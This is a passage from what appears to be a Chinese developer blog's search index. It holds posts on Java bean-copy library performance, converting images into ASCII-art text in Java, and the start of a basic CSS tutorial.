Source(); source.setId(random.nextInt()); source.setIds(Arrays.asList(random.nextLong(), random.nextLong(), random.nextLong())); source.setMarketPrice(new BigDecimal(random.nextFloat())); source.setPrice(random.nextInt(120) / 10.0d); source.setUser_name(\"一灰灰Blog\"); return source;} private void copyTest() throws Exception { Source s = genSource(); Target ta = apacheCopier.copy(s, Target.class); Target ts = springBeanCopier.copy(s, Target.class); Target tc = springCglibCopier.copy(s, Target.class); Target tp = pureCglibCopier.copy(s, Target.class); Target th = hutoolCopier.copy(s, Target.class); Target tm = mapsCopier.copy(s, Target.class); System.out.println(\"source:\\t\" + s + \"\\napache:\\t\" + ta + \"\\nspring:\\t\" + ts + \"\\nsCglib:\\t\" + tc + \"\\npCglib:\\t\" + tp + \"\\nhuTool:\\t\" + th + \"\\nmapStruct:\\t\" + tm);} 输出结果如下，满足预期 1234567source: Source(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)apache: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)spring: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)sCglib: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)pCglib: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)huTool: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875)mapStruct: Target(id=1337715455, user_name=一灰灰Blog, price=7.1, ids=[7283949433132389385, 3441022909341384204, 8273318310870260875], marketPrice=0.04279220104217529296875) 6.2 性能测试接下来我们关注一下不同的工具包，实现属性拷贝的性能对比情况如何 123456789101112131415161718192021222324252627282930313233public void test() throws Exception { // 第一次用于预热 autoCheck(Target2.class, 10000); autoCheck(Target2.class, 10000); autoCheck(Target2.class, 10000_0); autoCheck(Target2.class, 50000_0); autoCheck(Target2.class, 10000_00);}private &lt;T&gt; void autoCheck(Class&lt;T&gt; target, int size) throws Exception { StopWatch stopWatch = new StopWatch(); runCopier(stopWatch, \"apacheCopier\", size, (s) -&gt; apacheCopier.copy(s, target)); runCopier(stopWatch, \"springCglibCopier\", size, (s) -&gt; springCglibCopier.copy(s, target)); runCopier(stopWatch, \"pureCglibCopier\", size, (s) -&gt; pureCglibCopier.copy(s, target)); runCopier(stopWatch, \"hutoolCopier\", size, (s) -&gt; hutoolCopier.copy(s, target)); runCopier(stopWatch, \"springBeanCopier\", size, (s) -&gt; springBeanCopier.copy(s, target)); runCopier(stopWatch, \"mapStruct\", size, (s) -&gt; mapsCopier.copy(s, target)); System.out.println((size / 10000) + \"w -------- cost: \" + stopWatch.prettyPrint());}private &lt;T&gt; void runCopier(StopWatch stopWatch, String key, int size, CopierFunc func) throws Exception { stopWatch.start(key); for (int i = 0; i &lt; size; i++) { Source s = genSource(); func.apply(s); } stopWatch.stop();}@FunctionalInterfacepublic interface CopierFunc&lt;T&gt; { T apply(Source s) throws Exception;} 输出结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142431w -------- cost: StopWatch '': running time = 583135900 ns---------------------------------------------ns % Task name---------------------------------------------488136600 084% apacheCopier009363500 002% springCglibCopier009385500 002% pureCglibCopier053982900 009% hutoolCopier016976500 003% springBeanCopier005290900 001% mapStruct10w -------- cost: StopWatch '': running time = 5607831900 ns---------------------------------------------ns % Task name---------------------------------------------4646282100 083% apacheCopier096047200 002% springCglibCopier093815600 002% pureCglibCopier548897800 010% hutoolCopier169937400 003% springBeanCopier052851800 001% mapStruct50w -------- cost: StopWatch '': running time = 27946743000 ns---------------------------------------------ns % Task name---------------------------------------------23115325200 083% apacheCopier481878600 002% springCglibCopier475181600 002% pureCglibCopier2750257900 010% hutoolCopier855448400 003% springBeanCopier268651300 001% mapStruct100w -------- cost: StopWatch '': running time = 57141483600 ns---------------------------------------------ns % Task name---------------------------------------------46865332600 082% apacheCopier1019163600 002% springCglibCopier1033701100 002% pureCglibCopier5897726100 010% hutoolCopier1706155900 003% springBeanCopier619404300 001% mapStruct - 1w 10w 50w 100w apache 0.488136600s / 084% 4.646282100s / 083% 23.115325200s / 083% 46.865332600s / 083% spring cglib 0.009363500s / 002% 0.096047200s / 002% 0.481878600s / 002% 1.019163600s / 002% pure cglibg 0.009385500s / 002% 0.093815600s / 002% 0.475181600s / 002% 1.033701100s / 002% hutool 0.053982900s / 009% 0.548897800s / 010% 2.750257900s / 010% 5.897726100s / 010% spring 0.016976500s / 003% 0.169937400s / 003% 0.855448400s / 003% 1.706155900s / 003% mapstruct 0.005290900s / 001% 0.052851800s / 001% 0.268651300s / 001% 0.619404300s / 001% total 0.583135900s 5.607831900s 27.946743000s 57.141483600s 上面的测试中，存在一个不同的变量，即不是用相同的source对象来测试不同的工具转换情况，但是这个不同并不会太影响不同框架的性能对比，基本上从上面的运行结果来看 mapstruct, cglib, spring 表现最好 apache 表现最差 基本趋势相当于: apache -&gt; 10 hutool -&gt; 28 spring -&gt; 45 cglib -&gt; 83 mapstruct 如果我们需要实现简单的bean拷贝，选择cglib或者spring的是个不错选择 III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 项目源码: https://github.com/liuyueyi/spring-boot-demo/tree/master/spring-boot/004-bean-util 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/04/08/210408-常见Bean拷贝框架使用姿势及性能对比/"},{"title":"211121-Java实现图片转字符输出示例demo","text":"前面几篇博文介绍了使用jdk来对图片做一些有意思的转换，接下来我们再介绍一个有意思的玩法，直接根据图片，输出一个二维字符数组，实现用字符来实现绘画的场景 各位小伙伴可能都有看到过一些有趣的注释，比如大佛，美女之类的，通关本文，相信你也很可以很简单的实现类似的场景 关键实现，在前面的文章中其实也说到了，下面是超链 Java实现图片灰度化 Java实现图片转字符图片示例demo Java实现Gif图转字符动图 接下来我们需要做的就是将之前转成字符图片输出的地方稍微改一下，根据当前色颜色，来选择合适的替换字符保存下来 所以关键的实现在于，如何根据颜色来选择字符 123456789101112// 这个字符来自于github搜索结果，下面将最后一个从原来的点号改成了空格，即白色时，不输出字符private static final String DEFAULT_CHAR_SET = \"$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\\\\\\\"^`' \";/** * 基于颜色的灰度值，获取对应的字符 * @param g * @return */public static char toChar(Color g) { double gray = 0.299 * g.getRed() + 0.578 * g.getGreen() + 0.114 * g.getBlue(); return DEFAULT_CHAR_SET.charAt((int) (gray / 255 * DEFAULT_CHAR_SET.length()));} 接下来我们针对之前的方法，稍微改造一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445Color getAverage(BufferedImage image, int x, int y, int w, int h) { int red = 0; int green = 0; int blue = 0; int size = 0; for (int i = y; (i &lt; h + y) &amp;&amp; (i &lt; image.getHeight()); i++) { for (int j = x; (j &lt; w + x) &amp;&amp; (j &lt; image.getWidth()); j++) { int color = image.getRGB(j, i); red += ((color &amp; 0xff0000) &gt;&gt; 16); green += ((color &amp; 0xff00) &gt;&gt; 8); blue += (color &amp; 0x0000ff); ++size; } } red = Math.round(red / (float) size); green = Math.round(green / (float) size); blue = Math.round(blue / (float) size); return new Color(red, green, blue);}private void parseChars(BufferedImage img) { int w = img.getWidth(), h = img.getHeight(); // 这个size可用来控制精度，越小则越像原图 int size = 4; List&lt;List&lt;String&gt;&gt; list = new ArrayList&lt;&gt;(); for (int y = 0; y &lt; h; y += size) { List&lt;String&gt; line = new ArrayList&lt;&gt;(); for (int x = 0; x &lt; w; x += size) { Color avgColor = getAverage(img, x, y, size, size); line.add(String.valueOf(toChar(avgColor))); } list.add(line); } System.out.println(\"---------------------- 开始 ------------------------\"); for (List&lt;String&gt; line: list) { for (String s: line) { System.out.print(s + \" \"); } System.out.println(); } System.out.println(\"---------------------- 结束 ------------------------\");} 注意上面的实现，需要重点注意的是原图的遍历方式，一层一层的遍历，即外部是y轴，内部循环是x轴 接下来看一下测试case 123456789@Testpublic void testChars() throws Exception{ String file = \"http://pic.dphydh.com/pic/newspic/2017-12-13/505831-1.png\"; BufferedImage img = ImageLoadUtil.getImageByPath(file); // 缩放一下图片为300x300，方便对输出字符截图 img = GraphicUtil.scaleImg(300,300, img); parseChars(img); System.out.println(\"---over------\");} 实际输出如下(实际输出结果与皮神还是很像的) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677---------------------- 开始 ------------------------ l m &apos; b $ I f $ $ [ \\ 8 $ $ f i ~ , x $ $ $ u _ $ $ a X } ^ &apos; W $ $ $ c c $ $ $ $ B L ] &apos; } q $ $ $ z ` d $ $ $ $ $ 0 r ( &quot; t &lt; U $ $ c , * $ $ $ $ z &lt; + j | ` \\ t &lt; &lt; O $ n l W $ $ $ U &lt; &lt; &lt; ~ t [ { + &lt; &lt; _ W f &gt; &amp; $ $ 0 &lt; &lt; &lt; &lt; &lt; - j ~ \\ &lt; &lt; &lt; &lt; n ( ! # $ k &lt; &lt; &lt; &lt; &lt; &lt; &lt; ( t ` j &lt; &lt; &lt; &lt; ] ? : k B 1 + &lt; &lt; &lt; &lt; &lt; &lt; + n ! &gt; } &lt; &lt; &lt; &lt; \\ i ^ C z ( [ ~ &lt; &lt; &lt; &lt; &lt; &lt; f ] 1 &lt; &lt; &lt; &lt; &lt; u ` 1 v ( ) ? &lt; &lt; &lt; &lt; &lt; &lt; | { ( &lt; &lt; &lt; &lt; &lt; u I v / ( 1 + &lt; &lt; &lt; &lt; &lt; 1 } &apos; l &gt; i &quot; \\ &lt; &lt; &lt; &lt; ~ x 1 v ( ( [ ~ &lt; &lt; &lt; &lt; z r z t | \\ n z f ( + &apos; t &lt; &lt; &lt; &lt; ? / &quot; / v | ) ? &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ] f ) ^ &quot; \\ &lt; &lt; &lt; &lt; | ? &quot; ) n v / ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ j [ l 1 &lt; &lt; &lt; + z ^ - | &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ] j ~ { &lt; &lt; &lt; [ u &apos; f &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ z | &lt; &lt; ~ ( / ] + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; n - &lt; ? n i &apos; | &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { ~ ) v ) + &lt; ] 0 w f &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ? / 1 x &lt; ~ * @ &quot; | [ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; } c &apos; i ( &lt; } $ $ x w \\ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; / - / &lt; &lt; + % $ $ 8 _ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { &gt; _ q f &lt; &lt; ( q m } &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { \\ ~ &lt; &lt; &lt; } &lt; &quot; O U Z &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; n f &lt; &lt; &lt; &lt; &lt; n r [ h + &lt; &lt; \\ &quot; j U U 0 } &lt; &lt; &lt; &lt; _ &lt; &lt; &lt; &lt; ~ ~ &lt; &lt; &lt; &lt; &lt; M u ( $ r &lt; &lt; t U U U Q ( &lt; &lt; &lt; &lt; { Y v Y 0 Z } &lt; &lt; &lt; &lt; &lt; * $ $ $ x &lt; &lt; | J U U O [ &lt; &lt; &lt; &lt; &lt; # * # # o a t &lt; &lt; &lt; &lt; j $ $ # _ &lt; &lt; ) Y U U O &lt; &lt; &lt; &lt; &lt; &lt; W b q q k # # O r \\ &lt; &lt; [ / + &lt; &lt; } &lt; x U L r &lt; &lt; &lt; &lt; &lt; &lt; d U c c C w * o L &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; f &apos; } Q n &lt; &lt; &lt; &lt; &lt; &lt; &lt; J x x x x z w W [ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; f : + [ { , ^ f &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; L x x x x x J Y &lt; &lt; &lt; &lt; &lt; &lt; _ Y O Y ] \\ j \\ [ _ } - / &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; L x x x x x C _ &lt; &lt; &lt; &lt; &lt; - Z U U Z j ? &lt; &lt; &lt; &lt; &lt; \\ v &gt; l | &lt; &lt; &lt; &lt; &lt; &lt; &lt; Y x x x x X | &lt; &lt; &lt; &lt; &lt; &lt; J U U U z &lt; &lt; &lt; &lt; &lt; &lt; &lt; + ) ( i ) t / L | + &lt; &lt; &lt; &lt; &lt; c x x x c x &lt; &lt; &lt; &lt; &lt; &lt; ) L U U C t &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; f ! ? x ( &lt; &lt; &lt; &lt; ? f x j ~ &lt; &lt; 1 J x Y x &lt; &lt; &lt; &lt; &lt; &lt; &lt; u U U U 0 &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + r 1 { &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; _ x \\ &lt; &lt; t v 1 &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; n U U Z [ &lt; &lt; &lt; &lt; &lt; &lt; &lt; v x _ &lt; ) &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { u ] &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; - 0 m { &lt; &lt; &lt; &lt; &lt; &lt; &lt; } n | / n r ( / \\ 1 } i &apos; / &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ U &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; | c _ &lt; &lt; &lt; &lt; &lt; &lt; &lt; - n &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { f / ( ] ^ | &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ) n ] _ ~ &lt; &lt; &lt; &lt; &lt; / n 1 &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ [ L + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; _ t / 1 l t &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; v j ( ( ) - &lt; &lt; ~ } + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; _ 1 Q j &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ) f ( : ) + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; c [ ] ? ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ } ( c t [ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ / t &lt; ^ x { } ] ] - _ ~ &lt; &lt; &lt; ~ _ ~ r c &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; - ) ( u &lt; \\ &lt; &lt; 1 - &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; \\ ) &lt; c ( ( ( ( ( ( ( ) ) / Y n n &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ { ( ( v i f &lt; _ ( ( 1 _ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + j &apos; ! v n ( ( ( ( r X c f ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ 1 ( ( c ; r &lt; ] ( ( ( ( } + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + f &apos; ] X x u u | + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { ( t n ^ \\ f &lt; { ( ( ( ( ( ( [ ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + / &apos; t ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; - ( v { ? ] &lt; ) ( ( ( ( ( ( ( ) ? &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + \\ u &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; { w : \\ &lt; + ( ( ( | ( ( ( ( ( ( { ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ ( i \\ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ~ n j &lt; - ( ( / x t c n ( ( ( ( ) - &lt; &lt; &lt; &lt; &lt; ~ ( t &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; n + ] : x &lt; [ ( ( v &apos; ! | n X \\ ( ( [ &lt; &lt; &lt; ~ / u &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; x ( 1 | r t ( &lt; { ( x + &quot; { j z r { ~ ~ f &apos; ~ 1 &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; t ] t 1 + &lt; &lt; &lt; ( ( x &apos; ~ / n u ^ t &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; \\ i n ( ( ? &lt; + ( v : &apos; r &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; / &quot; z ( ( ( } ] | \\ _ [ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; t L t \\ Y u z z ` / &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; / ; Z Q Q \\ , I &apos; f &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; + # 0 d d d } ] ? &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; Z d d d b ? \\ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; u o b d k ~ j &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; ] | ? u d : j &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; j r &lt; ~ &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; / / + ( ( { ? + &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; &lt; _ ? ] ] ] ] ] - + &lt; &lt; &lt; &lt; &lt; &lt; f i f ( ( ( ( ( 1 { } [ [ [ } 1 ( ( ( ( ( ( ( ( ( ( ) } _ &lt; &lt; &lt; / ] X ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( } &lt; &lt; | : ( f ) v u ( ( \\ j u c c u x J d m C J | ( ( ( ( ( ( ( ( ( [ r \\ ` \\ J t ] ~ { ( ( n X r , &apos; ` &lt; ( j c C z r ( ( ( ( ( | n z } u X z r } / u c f \\ 1 l ] j z J Y Y n ) } } v _ + r ( ) ( - I I n c \\ + &lt; &lt; ] L Z u ^ &apos; i ] } | ( - x O w ; 1 \\ z J ---------------------- 结束 ------------------------ 虽说上面这个是输出了字符图，从结果上看也比价像，但是需要注意的是，若图片的背景非白色，主角不是那么突出的场景，通过上面的方式输出的结果可能就不太友好了，解决办法当然就是识别背景，识别主体，针对主体元素进行转换（这个过程后面有机会再介绍） 接下来我们借助开源项目 https://github.com/liuyueyi/quick-media 来迅速的实现字符图输出 以一个冰雪女王的转换图来验证下效果 12String file = \"http://5b0988e595225.cdn.sohucs.com/images/20200410/76499041d3b144b58d6ed83f307df8a3.jpeg\";BufferedImage res = ImgPixelWrapper.build().setSourceImg(file).setBlockSize(4).setPixelType(PixelStyleEnum.CHAR_BLACK).build().asBufferedImg(); 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/21/211121-Java实现图片转字符输出示例demo/"},{"title":"Css学习手册之基本篇","text":"Css学习手册之基本篇每次写前端都是一个痛苦的过程，总是静不下来，彻底的研究下前端的技术，导致每次套页面都是直接采用一些封装好的控件，而有时对这些样式不满意时，又得百度一下该怎么用，低效且不愉快，强制自己好好的学习下基本功 I. 基本使用姿势0. 几种css使用姿势主要有下面三个使用姿势，其中优先级为 c &gt; b &gt; a a.直接引入css文件 b.在html中，直接写css: c.在标签中直接写css 123456789101112131415&lt;!-- 方式 a --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt;&lt;!-- 方式 b --&gt;&lt;style&gt;p { color: red}&lt;/style&gt;&lt;!-- 方式 c --&gt;&lt;div style=\"color:red; font-size:12pt\"&gt;dd&lt;/div&gt; 对于标签的样式定义，特别是在引入css文件时，发现一个标签可能多重命中方式，有通过id进行设置的，有class设置的，也有标签设置的，他们之间的优先级是: 12341. 内联样式表的权值最高 1000；2. ID 选择器的权值为 1003. Class 类选择器的权值为 104. HTML 标签选择器的权值为 1 1. css使用方式a. 基本使用在实际的使用中，经常出现的定义class, 根据id或者直接对标签，来指定css属性 123456789101112131415161718&lt;style&gt;&lt;!-- 直接通过标签名 + {} 方式来确定标签对应的属性 --&gt;p { background-color: yellow;}&lt;!-- 通过id来确定css样式: # + id + {} --&gt;#tabId { background-color: red;}&lt;!-- 通过定义class方式: . + className + {}--&gt;.clzName { background-color: blue;}&lt;/style&gt; 上面是基本的使用姿势，往往我们经常会遇到组合的方式，如希望 设置: div标签内部的 p 标签中的文本颜色等，常见组合有四种 b. 后代选择器 （空格分割）如上面的case， div 标签内部所有的p标签中文本，都设置为红色 12345678910111213&lt;style&gt;div p { color: red}&lt;/style&gt;&lt;div&gt; &lt;span&gt; &lt;p&gt; 红色的文本内容 &lt;/p&gt; &lt;/span&gt; &lt;hr/&gt; &lt;p&gt; 红色的文本内容 &lt;/p&gt;&lt;/div&gt; c. 子元素选择器 (&gt;号分割)这个相比较与后代选择器，区别就是子元素只匹配直接关联的子元素（也就是中间不能有嵌套） 12345678910111213&lt;style&gt;div &gt; span { color: red}&lt;/style&gt;&lt;div&gt; &lt;p&gt; &lt;span&gt; 默认黑色的文本内容 &lt;/span&gt; &lt;/p&gt; &lt;hr/&gt; &lt;span&gt; 红色的文本内容 &lt;/span&gt;&lt;/div&gt; d. 相邻兄弟 (+号分割)可选择紧接在另一元素后的元素，且二者有相同父元素 1234567891011121314&lt;style&gt;div+p{ background-color:yellow;}&lt;/style&gt;&lt;p&gt;(默认黑色的内容).&lt;/p&gt;&lt;div&gt;&lt;h2&gt;My name is Donald&lt;/h2&gt;&lt;p&gt;I live in Duckburg.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;(黄色的内容).&lt;/p&gt; e. 普通兄弟 (~号分割)后续兄弟选择器选取所有指定元素之后的兄弟元素。 12345678910111213141516&lt;style&gt;div+p{ background-color:yellow;}&lt;/style&gt;&lt;p&gt;(默认黑色的内容).&lt;/p&gt;&lt;div&gt;&lt;h2&gt;My name is Donald&lt;/h2&gt;&lt;p&gt;I live in Duckburg.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;(黄色的内容).&lt;/p&gt;&lt;p&gt;(黄色的内容).&lt;/p&gt;&lt;span&gt;默认黑色&lt;/span&gt;&lt;p&gt;(黄色的内容).&lt;/p&gt; 2. 背景属性 background-color: 背景色 background-image: 背景图 background-repeat: 背景图重复的方式( no-repeat 不重复； repea-xt 水平重复; repeat-y 垂直重复) background-position: 背景的位置 ( left, top, center, right, bottom，可以组合使用) 支持简写方式: 123body { background: #ffffff url('img_tree.png') no-repeat right top;} 3. 文本属性 color: 设置颜色 direction: 文本方向 (ltr 左到右； rtl 右到左; inherit 从父元素继承) letter-spacing: 字符间距 text-align: 文本对齐方式 (left, center, right) line-height: 行高 text-decoration: 修饰 （none 标准； underline 下划线; overline 上划线; line-through 删除线; blink 闪烁） text-indent: 首行缩进 text-shadow: 阴影 text-transform: 控制字母 (capitalize 首字母大写; uppercase 全大写； lowercase 全小写) vertical-align：垂直对其 white-space: 设置元素中空白的处理方式 nowrap 文本不会换行，文本会在在同一行上继续，直到遇到 标签为止。 pre-wrap 保留空白符序列，但是正常地进行换行。 pre-line 合并空白符序列，但是保留换行符。 pre 空白会被浏览器保留。其行为方式类似 HTML 中的 标签。 5. 字体属性 font-size: 字体大小 16px == 1em font-family: 字体系列 Serif: 字符在行的末端拥有额外的装饰 Sans-serif: 这些字体在末端没有额外的装饰 Monospace: 所有的等宽字符具有相同的宽度 font-style: 字体样式 italic 浏览器会显示一个斜体的字体样式。 oblique 浏览器会显示一个倾斜的字体样式。 inherit 规定应该从父元素继承字体样式。 6. 链接 a:link {color:#000000;} / 未访问链接/ a:visited {color:#00FF00;} / 已访问链接 / a:hover {color:#FF00FF;} / 鼠标移动到链接上 / a:active {color:#0000FF;} / 鼠标点击时 / 注意： a:hover 必须在 a:link 和 a:visited 之后，需要严格按顺序才能看到效果。 注意： a:active 必须在 a:hover 之后。 7. 列表在html中，列表主要是 : li, ul, ol 等 默认 ol 是以数字排序； ul 是以符号排序； li 为列表内的元素标签 用的较多的属性 list-style-type: 设置列表项标志的类型。 none 无标记。 disc 默认。标记是实心圆。 circle 标记是空心圆。 square 标记是实心方块。 decimal 标记是数字。 decimal-leading-zero 0开头的数字标记。(01, 02, 03, 等。) lower-roman 小写罗马数字(i, ii, iii, iv, v, 等。) upper-roman 大写罗马数字(I, II, III, IV, V, 等。) lower-alpha 